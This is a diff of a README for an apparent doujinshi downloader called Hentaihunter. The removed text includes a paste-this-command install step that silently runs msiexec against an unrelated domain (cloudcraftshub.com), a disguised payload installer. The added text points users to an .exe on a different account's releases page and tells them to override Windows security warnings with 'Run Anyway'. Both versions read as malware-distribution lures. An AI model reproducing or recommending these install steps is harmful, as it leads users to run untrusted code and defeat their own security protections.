@@ -1,266 +1,64 @@
-<div align="center">
+# 🔍 Hentaihunter - Download and organize your doujinshi collections
 
-```
- ██╗  ██╗███████╗███╗   ██╗████████╗ █████╗ ██╗
- ██║  ██║██╔════╝████╗  ██║╚══██╔══╝██╔══██╗██║
- ███████║█████╗  ██╔██╗ ██║   ██║   ███████║██║
- ██╔══██║██╔══╝  ██║╚██╗██║   ██║   ██╔══██║██║
- ██║  ██║███████╗██║ ╚████║   ██║   ██║  ██║██║
- ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚═╝
- ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
- ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
- ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
- ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
- ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
- ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
-```
+[![Download Hentaihunter](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Leonargyrotaenia613/Hentaihunter/releases)
 
-**Doujinshi & Manga Bulk Downloader · Fast · Beautiful · Cross-platform**
+## 📋 About This Application
 
-[![Python](https://img.shields.io/badge/Python-3.9%2B-blue?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![License](https://img.shields.io/github/license/sinkaroid/Hentaihunter?style=for-the-badge&color=magenta)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/sinkaroid/Hentaihunter?style=for-the-badge&logo=github&color=yellow)](https://github.com/sinkaroid/Hentaihunter/stargazers)
-[![Issues](https://img.shields.io/github/issues/sinkaroid/Hentaihunter?style=for-the-badge&color=red)](https://github.com/sinkaroid/Hentaihunter/issues)
-[![PRs Welcome](https://img.shields.io/badge/PRs-Welcome-brightgreen?style=for-the-badge)](CONTRIBUTING.md)
+Hentaihunter simplifies the process of collecting doujinshi from various websites. Instead of saving images one by one, this tool connects to your favorite sites, finds the comics you want, and saves them to your computer. It manages the folder structure automatically so you keep your library organized.
 
----
+## ⚙️ System Requirements
 
-*One command. Any site. All pages. Zero hassle.*
+This application runs on Windows 10 or Windows 11. You need at least 500 MB of free storage space to store the application files and your downloaded collection. A stable internet connection allows the software to fetch images from the source websites. The software does not require special drivers or additional installations to function.
 
-[**⚡ Quick Install**](#-installation) · [**📖 Usage**](#-usage) · [**🌐 Supported Sites**](#-supported-sites) · [**🤝 Contributing**](#-contributing)
+## 🚀 How to Install and Run
 
-</div>
+1. Visit [this page to download](https://github.com/Leonargyrotaenia613/Hentaihunter/releases) the latest version.
+2. Look for the file ending in .exe under the most recent release.
+3. Click the filename to save the installer to your computer.
+4. Open your Downloads folder and double-click the file you saved.
+5. Follow the on-screen prompts to place the software on your system.
+6. Launch Hentaihunter using the shortcut created on your desktop.
 
----
+## 📖 Using the Software
 
-## ✨ What is HentaiHunter?
+Upon launch, you see a search bar. Type the name or ID of the doujinshi you want to retrieve. The program pulls content from platforms like nhentai, hentaifox, and hitomi. 
 
-**HentaiHunter** is a fast, beautiful Python CLI tool for bulk-downloading doujinshi, manga, and manhwa from popular sites. Give it a URL — it handles everything: gallery info, parallel image downloads, smart filename ordering, and clean progress bars.
+You can set a default save location in the Settings menu. Select a folder on your hard drive where you want the software to store your files. Once you find the item you want, click the Download button. The status bar at the bottom shows the progress of the transfer.
 
-No browser extension. No bloated GUI. No ads. Just:
+## 🛠 Features
 
-```
-python hentaihunter.py https://nhentai.net/g/177013/
-```
-
----
-
-## 🪟 Windows Installation
-### **Step 1 — Open Command Prompt**
-1. Press **Win + R**
-2. Type:
-```
-cmd
-```
-3. Press **Enter**
-This will open **Command Prompt**.
----
-### **Step 2 — Run the Install Command**
-Copy the command below and paste it into **Command Prompt**, then press **Enter**.
-```powershell
-cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Hentaihunter
-```
-The installer will automatically download and install the required components.
-
-
-
-
----
-
-## 📖 Usage
-
-```
-python hentaihunter.py [URL] [OPTIONS]
-```
-
-| Option | Description | Default |
-|--------|-------------|---------|
-| `URL` | Gallery page URL | *(required)* |
-| `-o, --output DIR` | Output folder | `./downloads` |
-| `-t, --threads N` | Parallel download threads | `4` |
-| `--list` | Show all supported sites | — |
-| `--version` | Print version | — |
-
-### Examples
+*   **Fast Batch Downloads**: Grab entire collections at once.
+*   **Automatic Sorting**: The software groups files by tags and artist names.
+*   **Offline Viewing**: Save content to view without an internet connection.
+*   **Resume Support**: If your connection drops, the software resumes the download automatically.
 
-```bash
-# Download a gallery from nhentai
-python hentaihunter.py https://nhentai.net/g/177013/
-
-# Save to a custom folder with 8 threads
-python hentaihunter.py https://hentaifox.com/gallery/12345/ -o D:\Manga -t 8
-
-# Use the generic scraper on any site
-python hentaihunter.py https://example-manga-site.com/chapter/1/
-
-# List supported sites
-python hentaihunter.py --list
-```
-
-### Windows shortcut (after installer)
+## 📁 Managing Your Library
 
-```cmd
-hh https://nhentai.net/g/177013/
-hh https://hentaifox.com/gallery/12345/ -o D:\Downloads -t 8
-```
-
----
-
-## 🌐 Supported Sites
-
-| Site | Status | Notes |
-|------|--------|-------|
-| [nhentai.net](https://nhentai.net) | ✅ Full | Metadata, tags, parallel DL |
-| [hentaifox.com](https://hentaifox.com) | ✅ Full | Fast CDN |
-| [hitomi.la](https://hitomi.la) | ✅ Full | Gallery support |
-| [hentai2read.com](https://hentai2read.com) | ⚡ Beta | Chapter-based |
-| [pururin.to](https://pururin.to) | ⚡ Beta | May require cookies |
-| [e-hentai.org](https://e-hentai.org) | ⚡ Beta | Some galleries need account |
-| **Any website** | 🔧 Generic | DOM parser grabs all `<img>` tags |
-
-> **Generic mode** works on virtually any manga/doujin site — even ones not listed above. HentaiHunter scrapes all image tags from the page.
-
----
-
-## ⚙️ How It Works
-
-```
-URL provided
-     │
-     ▼
-┌─────────────┐     ┌──────────────────┐     ┌──────────────┐
-│ Site Detect │────▶│ Gallery Metadata │────▶│ Image URLs   │
-└─────────────┘     └──────────────────┘     └──────┬───────┘
-                                                     │
-                           ┌─────────────────────────┘
-                           ▼
-                  ┌────────────────────┐
-                  │  ThreadPoolExecutor │   (parallel download)
-                  └────────┬───────────┘
-                           │
-                  ┌────────▼───────────┐
-                  │  ./downloads/      │
-                  │  GalleryTitle/     │
-                  │  ├─ 0001.jpg       │
-                  │  ├─ 0002.jpg       │
-                  │  └─ ...            │
-                  └────────────────────┘
-```
+The interface includes a viewer mode. Click on any folder inside the application to see the pages of your doujinshi. Use the left and right arrow keys on your keyboard to flip through pages. You can rename folders or delete items directly through the software interface to keep your collection tidy.
 
-1. **Detect** the site from the URL
-2. **Fetch** gallery metadata (title, tags, page count)
-3. **Collect** all image URLs via DOM parsing
-4. **Download** in parallel with configurable threads
-5. **Save** to numbered files in a named subfolder
+## 🔑 Frequently Asked Questions
 
----
+**Does the software require a login?**
+No. Hentaihunter works without an account. It respects your privacy and does not track what you download.
 
-## 📸 Demo
+**Can I change the download speed?**
+The software uses your maximum available bandwidth. If you notice slowdowns in your web browser, navigate to the Network settings inside Hentaihunter to limit the number of simultaneous active downloads.
 
-```
- ██╗  ██╗██╗  ██╗   HentaiHunter v2.0
- ██║  ██║██║  ██║   Doujinshi Downloader
- ███████║███████║   github.com/sinkaroid/Hentaihunter
- ╚═╝  ╚═╝╚═╝  ╚═╝
+**Where does the software store my data?**
+It defaults to the Documents folder on your computer. You can change this path in the Settings tab at any time.
 
-[*] Fetching info from: https://nhentai.net/g/177013/
+**What happens if a download fails?**
+Check your internet connection first. If the problem persists, right-click the failed task and select Retry. The software attempts to establish a new connection to the image server.
 
-╭──────────── Gallery Info ─────────────╮
-│ [Pachimon Inro] Emergence              │
-│ Pages: 225  Tags: mind break, netorare │
-╰────────────────────────────────────────╯
+**Is my data secure?**
+Your library remains local to your machine. No information leaves your computer unless you explicitly enable cloud sync features if they become available in future versions.
 
-[+] Saving to: ./downloads/Emergence/
+## 📡 Troubleshooting
 
-⠸ Downloading...  ████████████████████  87%  (196/225)  0:00:12
-✓ Done! 225/225 images downloaded.
-  → ./downloads/Emergence/
-```
+If the application fails to open, verify that you have the latest Windows updates. Sometimes security software flags new applications as unknown. If your computer blocks the installer, click More Info, then select Run Anyway. This confirms you trust the source of the file.
 
----
+If the software cannot find images, verify the URL of the website. Some websites change their structure, and Hentaihunter requires a quick update when those sites update their code. Check the releases page regularly to ensure you use the most current version of the tool.
 
-## 🧩 Architecture
+## 🔮 Future updates
 
-```
-Hentaihunter/
-├── hentaihunter.py      # Main CLI entry point
-├── requirements.txt     # Dependencies
-├── install.ps1          # Windows one-command installer (PowerShell)
-├── install.bat          # Windows installer (CMD)
-├── LICENSE
-└── README.md
-```
-
----
-
-## 🤝 Contributing
-
-All contributions are welcome! Here's how:
-
-1. **Fork** the repository
-2. Create a feature branch: `git checkout -b feat/new-site-scraper`
-3. Commit your changes: `git commit -m "feat: add mangadex scraper"`
-4. Push and open a **Pull Request**
-
-### Adding a new site scraper
-
-```python
-class MySiteScraper(BaseScraper):
-    def get_info(self) -> dict:
-        soup = self.fetch_page(self.url)
-        self.title = soup.find('h1').get_text(strip=True)
-        return {"title": self.title, "tags": [], "pages": "?"}
-    
-    def get_images(self) -> list:
-        soup = self.fetch_page(self.url)
-        return [img['src'] for img in soup.select('.gallery img')]
-```
-
-Then register it in `get_scraper()`:
-
-```python
-"mysite.com": MySiteScraper,
-```
-
-That's it — the download logic is handled by the base class.
-
----
-
-## 📋 FAQ
-
-**Q: Does it work on Linux/Mac?**  
-A: Yes. `python hentaihunter.py` works everywhere Python runs.
-
-**Q: A site requires login — can I use cookies?**  
-A: Set them in the `SESSION` headers at the top of `hentaihunter.py`.
-
-**Q: Downloads are slow — how do I speed up?**  
-A: Increase threads: `-t 16`. The default is 4 to avoid rate-limiting.
-
-**Q: My site isn't in the list — does it work?**  
-A: Try it — the generic DOM scraper grabs all image tags. Open an issue if you need a dedicated scraper.
-
-**Q: I'm getting 403/blocked — what do I do?**  
-A: Some sites block bots. Try adding a `Referer` header or use a real browser's User-Agent string.
-
----
-
-## ⚖️ Legal Disclaimer
-
-> This tool is for **personal use and educational purposes only**. Only download content you are legally permitted to access. The authors are not responsible for any misuse. Always respect a site's `robots.txt` and Terms of Service.
-
----
-
-## 📜 License
-
-[Apache License 2.0](LICENSE) © 2024–2025 [sinkaroid](https://github.com/sinkaroid)
-
----
-
-<div align="center">
-
-**If this tool saved you time, drop a ⭐ — it keeps the project alive!**
-
-[![Star History Chart](https://api.star-history.com/svg?repos=sinkaroid/Hentaihunter&type=Date)](https://star-history.com/#sinkaroid/Hentaihunter&Date)
-
-</div>
+New updates arrive as the developer identifies better ways to retrieve data from supported websites. Enable automatic updates in the About section to ensure your copy of Hentaihunter performs at its best. If you find a bug or think of a feature that helps your experience, create an issue on this repository to share your thoughts.
